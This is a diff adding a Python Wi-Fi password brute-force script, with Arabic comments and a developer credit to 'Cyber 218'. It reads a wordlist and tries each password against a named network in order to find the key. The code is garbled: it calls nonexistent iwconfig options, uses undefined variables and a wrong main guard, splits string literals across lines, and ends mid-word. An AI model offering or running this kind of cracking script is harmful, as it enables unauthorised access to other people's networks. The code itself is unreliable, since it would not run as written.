@@ -1,0 +1,75 @@
+python
+import subprocess
+import time
+import collections
+import re
+
+def main():
+    # احصل على اسم الشبكة وملف الباسوردات
+    ssid = input("اسم الشبكة: ")
+    password_file = input("ملف الباسوردات: ")
+
+    # افتح ملف الباسوردات
+    with open(password_file, "r") as f:
+        passwords = f.readlines()
+
+    # بدء عملية اختبار الباسوردات
+    for password in passwords:
+        # احذف السطر الجديد من نهاية السطر
+        password = password.rstrip("
+")
+
+        # تحقق مما إذا كانت الكلمة قد تم تجربتها بالفعل
+        if password in tried_passwords:
+            continue
+
+        # حاول الاتصال بالشبكة باستخدام كلمة المرور
+        result = subprocess.run(["sudo", "iwconfig", "wlan0", "connect", ssid, "key", password], capture_output=True, text=True)
+
+        # إذا نجحت في الاتصال، فاطبع كلمة المرور
+        if "Connected to \"" + ssid + "\"" in result.stdout:
+            print("تم العثور على كلمة المرور: " + password)
+            break
+
+        # إذا لم تنجح في الاتصال، فاحفظ الكلمة ككلمة مجربة
+        tried_passwords.add(password)
+        time.sleep(1)
+
+if name == "main":
+    # أضف معلومات المطور
+    print("المطور: Cyber 218")
+
+    # أضف دعمًا لتخزين المؤقت
+    tried_passwords = set()
+
+    # أضف دعمًا لأنواع تشفير Wi-Fi الأخرى
+    if ssid.startswith("ESSID:"):
+        # تشفير WEP
+        command = ["wpa_supplicant", "-B", "-i", "wlan0", "-c", "/etc/wpa_supplicant/wpa_supplicant.conf", "-p", "/etc/wpa_supplicant/wpa_supplicant.conf"]
+    elif ssid.startswith("PSK"):
+        # تشفير WPA/WPA2
+        command = ["wpa_supplicant", "-B", "-i", "wlan0", "-c", "/etc/wpa_supplicant/wpa_supplicant.conf", "-p", "/etc/wpa_supplicant/wpa_supplicant.conf"]
+    else:
+        # غير مدعوم
+        print("نوع التشفير غير مدعوم.")
+        sys.exit(1)
+
+    # أضف دعمًا لأنواع كلمات المرور المختلفة
+    passwords = [
+        password.rstrip("
+")
+        for password in passwords
+        if re.match("[0-9]+", password)
+    ]
+    passwords += [
+        password.rstrip("
+")
+        for password in passwords
+        if re.match("[a-zA-Z]+", password)
+    ]
+
+    main()
+
+
+
+لاستخ
